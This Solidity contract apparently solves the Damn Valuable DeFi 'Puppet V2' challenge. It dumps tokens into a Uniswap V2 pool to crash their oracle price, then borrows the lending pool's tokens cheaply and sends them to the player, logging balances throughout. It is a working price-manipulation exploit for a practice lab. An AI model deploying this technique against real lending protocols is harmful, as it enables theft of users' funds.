// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { PuppetV2Pool } from "../../09_puppet-v2/PuppetV2Pool.sol";
import { DamnValuableToken } from "../../DamnValuableToken.sol";
import { IUniswapV2Router02 } from "../../../build-uniswap/v2/IUniswapV2Router02.sol";
import { WETH } from "../../WETH.sol";
import { console } from "forge-std/console.sol";

contract AttackPuppetV2 {
    receive() external payable { }

    function attack(
        PuppetV2Pool lendingPool,
        DamnValuableToken token,
        IUniswapV2Router02 uniswapV2Router02,
        address player
    )
        external
        payable
    {
        uint256 playerTokenBalance = 10_000 ether - 1 ether;
        uint256 hackTokenAmount = 1_000_000 ether;

        WETH weth = WETH(payable(uniswapV2Router02.WETH()));

        console.log("lendingPool balance: ", address(lendingPool).balance);
        console.log("lendingPool weth balance: ", weth.balanceOf(address(lendingPool)));
        console.log("lendingPool token balance: ", token.balanceOf(address(lendingPool)));

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        console.log("befor address(this).balance: ", address(this).balance);

        token.approve(address(uniswapV2Router02), playerTokenBalance);
        uniswapV2Router02.swapExactTokensForTokens(playerTokenBalance, 1 ether, path, address(this), block.timestamp);

        console.log(" address(this).balance: ", address(this).balance);

        weth.deposit{ value: address(this).balance }();

        uint256 requiredAmountEth = lendingPool.calculateDepositOfWETHRequired(hackTokenAmount);

        console.log("requiredAmountEth: ", requiredAmountEth);

        weth.approve(address(lendingPool), weth.balanceOf(address(this)));
        lendingPool.borrow(hackTokenAmount);

        console.log("token.balanceOf(address(this): ", token.balanceOf(address(this)));

        token.transfer(player, token.balanceOf(address(this)));

        console.log("token.balanceOf(address(player): ", token.balanceOf(address(player)));
        console.log("weth.balanceOf(address(this)): ", weth.balanceOf(address(this)));

        weth.transfer(player, weth.balanceOf(address(this)));

        console.log("address(player).balance: ", address(player).balance);

        console.log("lendingPool balance: ", address(lendingPool).balance);
        console.log("lendingPool weth balance: ", weth.balanceOf(address(lendingPool)));
        console.log("lendingPool token balance: ", token.balanceOf(address(lendingPool)));
    }
}
